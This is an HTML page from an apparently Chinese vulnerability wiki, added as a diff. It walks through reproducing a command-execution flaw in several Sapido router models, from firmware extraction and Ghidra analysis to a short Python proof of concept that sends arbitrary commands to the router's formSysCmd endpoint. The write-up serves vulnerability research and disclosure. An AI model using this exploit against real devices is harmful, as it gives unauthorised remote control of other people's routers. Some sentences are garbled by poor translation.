@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/IOT%E5%AE%89%E5%85%A8/Sapido/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Sapido多款路由器命令执行漏洞&amp;突破 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Sapido\u591a\u6b3e\u8def\u7531\u5668\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u0026amp;\u7a81\u7834", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Selea/Selea%20OCR-ANPR%E6%91%84%E5%83%8F%E6%9C%BA%20SeleaCamera%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Selea/Selea%20OCR-ANPR%E6%91%84%E5%83%8F%E6%9C%BA%20SeleaCamera%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Sapido 多款路由器 远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="sapido">Sapido多款路由器命令执行漏洞&amp;突破<a class="headerlink" href="#sapido" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>BR270n-v2.1.03</p>
+<p>BRC76n-v2.1.03</p>
+<p>GR297-v2.1.3</p>
+<p>RB1732-v2.0.43</p>
+<p>之前的版本存在命令执行漏洞</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="0x01">0x01 固件环境模拟<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h3>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/1-20201014111751161.png" /></p>
+<h3 id="0x02-binwalk">0x02 binwalk解压固件<a class="headerlink" href="#0x02-binwalk" title="Permanent link">&para;</a></h3>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/2-20201014111751167.png" /></p>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/3-20201014111751162.png" /></p>
+<h3 id="0x03-web">0x03 查看web容器<a class="headerlink" href="#0x03-web" title="Permanent link">&para;</a></h3>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/4-20201014111751163.png" /></p>
+<p>对于嵌入式设备而言，很多服务都是移植开源的，<code>/etc/init.d</code>文件夹下是路由器启动时的加载项，在这些文件中可以看到很多的启动服务等，但是在这里我没有发现<code>web</code>容器的启动项，猜测可能厂商进行了二次开发</p>
+<h3 id="0x04-http">0x04 查找http服务模块<a class="headerlink" href="#0x04-http" title="Permanent link">&para;</a></h3>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/5-20201014111751171.png" /></p>
+<p>在这里可以看到很多关于<code>http</code>的，我们不去关注<code>web</code>网页出现的。因为我们想要知道这款路由器的<code>web</code>容器是其中，所以我们把重点放在前面的<code>elf</code>文件处，在这里我们看到一个<code>cm</code>的<code>elf</code>文件，如果知道开源的<code>web</code>服务器<code>boa</code>可能猜到一些，下面就是<code>boa</code>的架构</p>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/6-20201014111751178.png" /></p>
+<p>可以这里清晰的看到<code>web</code>层的英文如何状语从句：底层通过<code>boa</code>进行交互的。那么对于不知道的容器我们又该如何去分析呢？继续我们去分析剩下的<code>elf</code>程序，名字通过逐个状语从句：我们分析在<code>sysconf</code>程序中发现了<code>http</code>请求的处理方式，使用<code>ghidra</code>来分析<code>sysconf</code></p>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/7-20201014111751179.png" /></p>
+<p>通过全文搜索定位<code>http</code>到关键函数，在这里我们发现了一个关键的函数<code>apmib_get</code>通过猜测也能大概猜到这是一个关于获取的函数，通过<code>google</code>可以搜索到这个函数，会发现这个函数是关于<code>web</code>开源服务器的<code>boa</code>用到的函数，到那么这里我们就已经确认这款路由器的<code>web</code>容器的英文<code>boa</code>了。既然已经知道了<code>boa</code>，肯定那么这个知道有框架一个关键的文件<code>syscmd.htm</code>文件，可以执行系统命令，由于但是这款路由器的英文<code>asp</code>写的所以我们只进行检索<code>syscmd</code></p>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/8-20201014111751179.png" /></p>
+<p>这里可以发现两个文件，一个<code>elf</code>文件，一个<code>asp</code>文件，打开<code>asp</code>文件</p>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/9-20201014111751179.png" /></p>
+<p>在这里可以抛光页面可以执行系统命令</p>
+<h3 id="0x05-url">0x05 通过url访问指定页面<a class="headerlink" href="#0x05-url" title="Permanent link">&para;</a></h3>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/10-20201014111751181.png" /></p>
+<p>发现可以执行系统命令，那么这里又是如何处理的呢？</p>
+<p>通过上面的<code>asp</code>文件可以知道，对于输入的命令处理应该和<code>formSysCmd</code>有关联，这里我们进行<code>grep</code>搜索</p>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/11-20201014111751276.png" /></p>
+<p>可以看到一个<code>webs</code>的<code>elf</code>文件，那么可以猜测这里可能就是<code>syscmd</code>执行的临时文件了</p>
+<h3 id="0x06-webs">0x06 分析webs文件<a class="headerlink" href="#0x06-webs" title="Permanent link">&para;</a></h3>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/12-20201014111751187.png" /></p>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/13-20201014111751190.png" /></p>
+<p>上面就是整个命令执行的逐步实现方式了，第一个图片可以看到使用<code>system</code>函数执行输入的系统命令，第二个图片可以裁剪将执行的结果通过<code>cat</code>输入到<code>/web/obama.dat</code>文件中，最后将<code>obama.dat</code>中的内容输入到<code>web</code>界面的文本框里。</p>
+<h3 id="0x07-poc">0x07 poc<a class="headerlink" href="#0x07-poc" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code># Exploit Title: SAPIDO RB-1732 command line execution
+# Date: 2019-6-24
+# Exploit Author: k1nm3n.aotoi
+# Vendor Homepage: http://www.sapido.com.tw/
+# Software Link: http://www.sapido.com.tw/CH/data/Download/firmware/rb1732/tc/RB-1732_TC_v2.0.43.bin
+# Version: RB-1732 V2.0.43 
+# Tested on: linux
+
+
+import requests
+import sys
+
+def test_httpcommand(ip, command):
+   my_data = {&#39;sysCmd&#39;: command, &#39;apply&#39;: &#39;Apply&#39;, &#39;submit-url&#39;:&#39;/syscmd.asp&#39;, &#39;msg&#39;:&#39;&#39;}
+   r = requests.post(&#39;http://%s/goform/formSysCmd&#39; % ip, data = my_data)
+   content = r.text
+   content = content[
+     content.find(&#39;&lt;textarea rows=&quot;15&quot; name=&quot;msg&quot; cols=&quot;80&quot; wrap=&quot;virtual&quot;&gt;&#39;)+56:
+     content.rfind(&#39;&lt;/textarea&gt;&#39;)]
+   return content
+
+print test_httpcommand(sys.argv[1], &quot; &quot;.join(sys.argv[2:]))
+</code></pre></div>
+<h3 id="0x08">0x08 运行截图<a class="headerlink" href="#0x08" title="Permanent link">&para;</a></h3>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/14-20201014111751194.png" /></p>
+<h3 id="0x09-br270n-v2103">0x09 BR270n-v2.1.03命令执行突破<a class="headerlink" href="#0x09-br270n-v2103" title="Permanent link">&para;</a></h3>
+<p>这个原理和RB1732差不多，只不过访问的页面变成了<code>syscmd.htm</code>了</p>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/15-20201014111751195.png" /></p>
+<h3 id="0x010-brc76n-v2103">0x010 BRC76n-v2.1.03命令执行漏洞<a class="headerlink" href="#0x010-brc76n-v2103" title="Permanent link">&para;</a></h3>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/16-20201014111751196.png" /></p>
+<h3 id="0x011-gr297-v213">0x011 GR297-v2.1.3命令执行漏洞<a class="headerlink" href="#0x011-gr297-v213" title="Permanent link">&para;</a></h3>
+<p><img alt="image" src="../resource/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%E7%AA%81%E7%A0%B4/media/17-20201014111751197.png" /></p>
+<h3 id="0x012">0x012 总结<a class="headerlink" href="#0x012" title="Permanent link">&para;</a></h3>
+<p>BR270n，RB1732命令执行有个重置就是登陆路由器，可以进行信息的同步获取用户名和密码，而且又有很多路由器使用的还是其他用户名和密码，GR297，BRC76n则不需要进行登陆</p>
+<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="http://lab.xinruisec.com/2019/09/05/Sapido多款路由器命令执行漏洞/">http://lab.xinruisec.com/2019/09/05/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Selea/Selea%20OCR-ANPR%E6%91%84%E5%83%8F%E6%9C%BA%20SeleaCamera%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Selea/Selea%20OCR-ANPR%E6%91%84%E5%83%8F%E6%9C%BA%20SeleaCamera%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Sapido 多款路由器 远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
